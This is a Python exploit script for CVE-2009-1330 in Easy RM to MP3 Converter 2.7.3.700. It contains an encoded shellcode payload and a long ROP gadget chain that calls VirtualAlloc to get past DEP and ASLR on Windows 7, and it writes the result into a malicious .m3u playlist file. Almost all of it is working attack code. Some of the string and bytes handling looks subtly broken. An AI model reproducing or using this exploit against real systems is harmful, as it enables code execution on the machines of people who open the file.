# Title: Easy RM to MP3 Converter (DEP + ASLR bypass) - CVE-2009-1330
# Exploit Author: lem0nSec
# Version: 2.7.3.700
# Tested on: Windows 7 Professional 64 bit

from struct import pack


shellcode =  b""
shellcode += b"\xba\xf2\x24\x53\xe5\xda\xce\xd9\x74\x24\xf4\x5e\x31"
shellcode += b"\xc9\xb1\x31\x83\xee\xfc\x31\x56\x0f\x03\x56\xfd\xc6"
shellcode += b"\xa6\x19\xe9\x85\x49\xe2\xe9\xe9\xc0\x07\xd8\x29\xb6"
shellcode += b"\x4c\x4a\x9a\xbc\x01\x66\x51\x90\xb1\xfd\x17\x3d\xb5"
shellcode += b"\xb6\x92\x1b\xf8\x47\x8e\x58\x9b\xcb\xcd\x8c\x7b\xf2"
shellcode += b"\x1d\xc1\x7a\x33\x43\x28\x2e\xec\x0f\x9f\xdf\x99\x5a"
shellcode += b"\x1c\x6b\xd1\x4b\x24\x88\xa1\x6a\x05\x1f\xba\x34\x85"
shellcode += b"\xa1\x6f\x4d\x8c\xb9\x6c\x68\x46\x31\x46\x06\x59\x93"
shellcode += b"\x97\xe7\xf6\xda\x18\x1a\x06\x1a\x9e\xc5\x7d\x52\xdd"
shellcode += b"\x78\x86\xa1\x9c\xa6\x03\x32\x06\x2c\xb3\x9e\xb7\xe1"
shellcode += b"\x22\x54\xbb\x4e\x20\x32\xdf\x51\xe5\x48\xdb\xda\x08"
shellcode += b"\x9f\x6a\x98\x2e\x3b\x37\x7a\x4e\x1a\x9d\x2d\x6f\x7c"
shellcode += b"\x7e\x91\xd5\xf6\x92\xc6\x67\x55\xf8\x19\xf5\xe3\x4e"
shellcode += b"\x19\x05\xec\xfe\x72\x34\x67\x91\x05\xc9\xa2\xd6\xfa"
shellcode += b"\x83\xef\x7e\x93\x4d\x7a\xc3\xfe\x6d\x50\x07\x07\xee"
shellcode += b"\x51\xf7\xfc\xee\x13\xf2\xb9\xa8\xc8\x8e\xd2\x5c\xef"
shellcode += b"\x3d\xd2\x74\x8c\xa0\x40\x14\x7d\x47\xe1\xbf\x81"


# bad characters: \x00\x0a

# VirtualAlloc
'''
 EAX = NOP (0x90909090)
 ECX = flProtect (0x40)
 EDX = flAllocationType (0x1000)
 EBX = dwSize
 ESP = lpAddress (automatic)
 EBP = ReturnTo (ptr to jmp esp)
 ESI = ptr to VirtualAlloc()
 EDI = ROP NOP (RETN)
'''


def generate_rop():

    gadgets = [

        # padding
        0x100308BF,
        0x100308BF,
        0x100308BF,
        0x100308BF,
        0x100308BF,
        0x100308BF,
        0x100308BF,
        0x100308BF,
        0x100308BF,
        0x100308BF,

        # set edx --> 0x1000
        0x1002a21d, # pop eax # retn
        0xFFFFF001, # 999 to negate and inc
        0x1001e7b4, # neg eax # pop ebx # retn
        0x41414141,
        0x1001cba1, # inc eax # pop ebx # retn
        0x41414141,
        0x1001bdee, # push eax # mov eax,1 # pop ebx # ADD ESP,8 # RETN
        0x100308BF,
        0x100308BF,
        0x100308BF,
        0x100308BF,
        0x100308BF,
        0x100308BF,
        0x100308BF,
        0x100308BF,
        0x100253bc, # xor edx,edx # retn
        0x10024ece, # ADD EDX,EBX # POP EBX # RETN 0x10
        0x41414141,
        0x100308BF,
        0x100308BF,
        0x100308BF,
        0x100308BF,
        0x100308BF,
        0x100308BF,
        0x100308BF,
        0x100308BF,
        0x100308BF,
        0x100308BF,


        # set esi --> & ptr VirtualAlloc
        0x1002a21d, # pop eax # retn
        0x10032078, # ptr VirtualAlloc
        0x1002e0c8, # mov eax,dword ptr ds:[eax]
        0x1001A788, # PUSH EAX # POP ESI # POP EBP # MOV EAX,1 # POP EBX # POP ECX # RETN
        0x41414141,
        0x41414141,
        0x41414141,


        # set ecx --> 0x40
        0x10020c64,  # POP ECX # RETN [MSRMfilter03.dll]
        0xffffffff,  #
        0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
        0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll]
        0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
        0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
        0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
        0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
        0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
        0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
        0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
        0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
        0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
        0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
        0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
        0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
        0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
        0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
        0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
        0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
        0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
        0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
        0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
        0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
        0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
        0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
        0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
        0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
        0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
        0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
        0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
        0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
        0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
        0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
        0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
        0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
        0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
        0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
        0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
        0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
        0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
        0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
        0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
        0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
        0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
        0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
        0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
        0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
        0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
        0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
        0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
        0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
        0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
        0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
        0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
        0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
        0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
        0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
        0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
        0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
        0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
        0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
        0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
        0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
        0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
        0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll] 
        0x1002dd3e,  # INC ECX # AND EAX,8 # RETN [MSRMfilter03.dll]


        # set ebx --> dwSize
        0x1002a21d, # pop eax # retn
        0xFFFFFE8F, # 0x171 to negate
        0x1001e7b4, # neg eax # pop ebx # retn
        0x41414141,
        0x1001bdee, # push eax # mov eax,1 # pop ebx # ADD ESP,8 # RETN
        0x100308BF,
        0x100308BF,
        0x100308BF,
        0x100308BF,
        0x100308BF,
        0x100308BF,
        0x100308BF,
        0x100308BF,

        # set edi --> retn
        0x1001c05e, # pop edi # retn
        0x100308BF, # retn

        # set ebp --> ptr jmp esp
        0x1002821b, # pop ebp # retn
        0x1001af9d, # add esp,8 # retn

        # set eax to contain pushad/retn (0x00410a31) then pushing it and returning to it +++ ptr to esp at the end
        0x1002a21d, # pop eax # retn
        0xA2E905C7,
        0x1002dae4, # ADD EAX,5D58046A # retn
        0x1002412d, # push eax # retn
        0x100308BF, # retn
        0x1001b058, # push esp # retn

        
        ]

    chain = []
    for gadget in gadgets:
        chain.append(pack("<I", gadget))
    return "".join(chain)


def exploit():

    rop_chain = generate_rop()
    
    payload = "A"*26086
    payload += pack("<I", 0x100308BF)
    payload += rop_chain
    payload += "\x90"*16
    payload += shellcode


    f = open("sendme.m3u", "w")
    f.write(payload)
    f.close()

def main():
    exploit()

if __name__ == "__main__":
    main()
